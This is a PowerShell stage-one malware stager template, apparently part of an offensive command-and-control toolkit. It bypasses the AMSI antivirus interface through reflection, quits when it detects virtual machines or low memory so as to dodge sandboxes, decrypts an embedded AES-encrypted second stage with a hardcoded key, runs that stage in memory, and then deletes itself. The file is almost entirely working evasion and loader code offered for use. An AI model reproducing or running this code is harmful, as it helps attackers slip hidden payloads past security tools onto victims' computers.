# stagers/powershell/template.ps1

# ===================
# ⚠️ STAGE 1 PAYLOAD
# AES-256-CBC Decryption + Anti-VM + AMSI Bypass
# ===================

# --- AMSI Bypass (runtime, no IEX)
$Ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$Fld = $Ref.GetField('amsiInitFailed','NonPublic,Static')
$Fld.SetValue($null,$true)

# --- Anti-VM checks
try {
    $man = (Get-WmiObject Win32_ComputerSystem).Manufacturer
    $ram = (Get-WmiObject Win32_OperatingSystem).TotalVisibleMemorySize
    if ($man -match "VMware|VirtualBox|KVM|Xen") { exit }
    if ($ram -lt 4000000) { exit }  # <4GB
} catch {}

# --- AES Decryption of Stage 2 (8608538f1ae9fb06d7ff79f72363eb5a:8+lkfPnVJI+9KxwJNCmBtQg9JjyS6y1821m/Web1knCR6kUUSDjpCYhiLhbsqJ7atxFFtT2NWs85mSrs4oQU0X7Ykob4X9atYwRDeO8wNN8pUhVLddMBRvpd3mwRfe+sVro1s5sESlssYGjkQaDl1RgEyjAXI2unCspKuqt5ctmsX/yNU+yRDRzg5dHy9v+hdg0vSkiZj0FbGl19LOUwDBVLpPC8vwCpXLyp02C+F/9M9L577UEWXqwhRNYwdgozBv6LFLZiG96dDsyVk6gQeQlYIxNVtwm5Ovvuv0VzI6eYrBTxje43KSA5v1ZA4hQmVXkQJVeD2P0O9Tgd8QDJdwQiuyB+UJRJKQ+Ju1sP3JO+A9Cp0KVtFHp6Kq7HEx6RnUELgfdSdtN2D22eaqO72z0IV10EZnVYs1UsN/odm+Tb87ACM7pzMdwCSwXXlwIf1RXYttsmeMz6pawaiRnhGZOit3Y2UqiEPwPeiwh/G73HK9QJWCqrWFgFSliPh50BBQZB4b+d7EO+e04WkIPpfJaW+I6jeK8oem2OLQW7SlDFxyOTET9/c8ZitaxWVkLI/hUJytT7RI+ZnHqetkMicUBAfM8HkMitHI35SG20dRqIn2JvXRjWSADK122PPfR3+kQdhefdwzRkPaPug7oev9wP8HGh5TOOZcpVqwiYUrnQ0+wo5KDyOWCPdi5eh+3eTuoWVH/UFP2G/GV49780xIqbpATR/QMDtmY6jF6muwUJlPZuzrgrIudH1rF/1bRVtDPfVTvpfwzQkIfOjVee5YkR7DIB9GxyYAnLYNNUTllZIrponTQULe20SCAcKKdgUEqPhsz5x0JrFb7x9cRU0LGwyZFWOdLldxlojfvEnY8yMOEZE5jNTPQ7QluTNZ64vh4dWdTLuar4Dhy0g3N528AR00vEOcQ3lXaOf4tnh63ARjPeiLp7udbifcRmsYrMjlbahBlyEcxYRjQwJ25VezTaVPQdrV/HqdJz+fh2ueIzzdKCKdbmlIiA3hfGSsdYTes7pwV5SY4wnSsO2cLuc8t4dHcOTunP2QfixFR9v2aKMHhsItPy2ouUpbjnJV550zi4X9HR+09jUKgPYz2SYzd3eQZ5xSBPdSozhjiBqZ4aWR1hAcdY7tnmwxhCmrfe)
$enc = "8608538f1ae9fb06d7ff79f72363eb5a:8+lkfPnVJI+9KxwJNCmBtQg9JjyS6y1821m/Web1knCR6kUUSDjpCYhiLhbsqJ7atxFFtT2NWs85mSrs4oQU0X7Ykob4X9atYwRDeO8wNN8pUhVLddMBRvpd3mwRfe+sVro1s5sESlssYGjkQaDl1RgEyjAXI2unCspKuqt5ctmsX/yNU+yRDRzg5dHy9v+hdg0vSkiZj0FbGl19LOUwDBVLpPC8vwCpXLyp02C+F/9M9L577UEWXqwhRNYwdgozBv6LFLZiG96dDsyVk6gQeQlYIxNVtwm5Ovvuv0VzI6eYrBTxje43KSA5v1ZA4hQmVXkQJVeD2P0O9Tgd8QDJdwQiuyB+UJRJKQ+Ju1sP3JO+A9Cp0KVtFHp6Kq7HEx6RnUELgfdSdtN2D22eaqO72z0IV10EZnVYs1UsN/odm+Tb87ACM7pzMdwCSwXXlwIf1RXYttsmeMz6pawaiRnhGZOit3Y2UqiEPwPeiwh/G73HK9QJWCqrWFgFSliPh50BBQZB4b+d7EO+e04WkIPpfJaW+I6jeK8oem2OLQW7SlDFxyOTET9/c8ZitaxWVkLI/hUJytT7RI+ZnHqetkMicUBAfM8HkMitHI35SG20dRqIn2JvXRjWSADK122PPfR3+kQdhefdwzRkPaPug7oev9wP8HGh5TOOZcpVqwiYUrnQ0+wo5KDyOWCPdi5eh+3eTuoWVH/UFP2G/GV49780xIqbpATR/QMDtmY6jF6muwUJlPZuzrgrIudH1rF/1bRVtDPfVTvpfwzQkIfOjVee5YkR7DIB9GxyYAnLYNNUTllZIrponTQULe20SCAcKKdgUEqPhsz5x0JrFb7x9cRU0LGwyZFWOdLldxlojfvEnY8yMOEZE5jNTPQ7QluTNZ64vh4dWdTLuar4Dhy0g3N528AR00vEOcQ3lXaOf4tnh63ARjPeiLp7udbifcRmsYrMjlbahBlyEcxYRjQwJ25VezTaVPQdrV/HqdJz+fh2ueIzzdKCKdbmlIiA3hfGSsdYTes7pwV5SY4wnSsO2cLuc8t4dHcOTunP2QfixFR9v2aKMHhsItPy2ouUpbjnJV550zi4X9HR+09jUKgPYz2SYzd3eQZ5xSBPdSozhjiBqZ4aWR1hAcdY7tnmwxhCmrfe"
$parts = $enc -split ':'
$ivHex = $parts[0]
$iv = for ($i = 0; $i -lt $ivHex.Length; $i += 2) { [Convert]::ToByte($ivHex.Substring($i,2),16) }
$cipherBytes = [Convert]::FromBase64String($parts[1])

$AES = New-Object System.Security.Cryptography.AesManaged
$AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
$AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$AES.KeySize = 256
$AES.BlockSize = 128

# 🔐 AES Key must match .env ENCRYPTION_KEY
$key = [Text.Encoding]::UTF8.GetBytes("Zxcvbnm1234567890Zxcvbnm12345678")
$AES.Key = $key
$AES.IV = $iv
$Decryptor = $AES.CreateDecryptor()
$ms = New-Object IO.MemoryStream(,$cipherBytes)
$cs = New-Object Security.Cryptography.CryptoStream($ms, $Decryptor, 'Read')
$sr = New-Object IO.StreamReader($cs)
$stage2 = $sr.ReadToEnd()

# --- Run Stage 2 in memory
$ScriptBlock = [ScriptBlock]::Create($stage2)
Invoke-Command -ScriptBlock $ScriptBlock

# --- Optional self-delete
try {
    $me = $MyInvocation.MyCommand.Path
    Remove-Item $me -Force
} catch {}
